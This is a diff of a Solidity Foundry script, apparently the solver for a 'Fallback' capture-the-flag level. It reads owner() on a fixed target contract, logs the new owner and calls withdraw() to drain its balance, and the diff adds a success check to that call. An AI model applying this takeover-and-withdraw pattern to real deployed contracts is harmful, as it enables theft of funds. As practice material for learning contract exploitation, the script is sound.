@@ -4,9 +4,7 @@ pragma solidity ^0.8.17;
 import "forge-std/Script.sol";
 import "forge-std/Test.sol";
 
-import "../src/Counter.sol";
-
-contract FallbackScript is Script, Test {
+contract Solve is Script, Test {
   address target = address(0x42aF6D338Dca9380619a7A51bAbE6045854FadA7);
 
   function run() public {
@@ -22,11 +20,12 @@ contract FallbackScript is Script, Test {
     emit log_named_bytes("Result received", result);
 
     (bool ownerSuccess, bytes memory ownerResult) = target.call(abi.encodeWithSignature("owner()"));
-    require(ownerSuccess, "Call to ownwer() failed");
+    require(ownerSuccess, "Call to owner() failed");
     address owner = abi.decode(ownerResult, (address));
     console.log("New owner is %s", owner);
 
-    target.call(abi.encodeWithSignature("withdraw()"));
+    (bool withdrawSuccess, ) = target.call(abi.encodeWithSignature("withdraw()"));
+    require(withdrawSuccess, "Call to withdraw() failed");
 
     vm.stopBroadcast();
   }
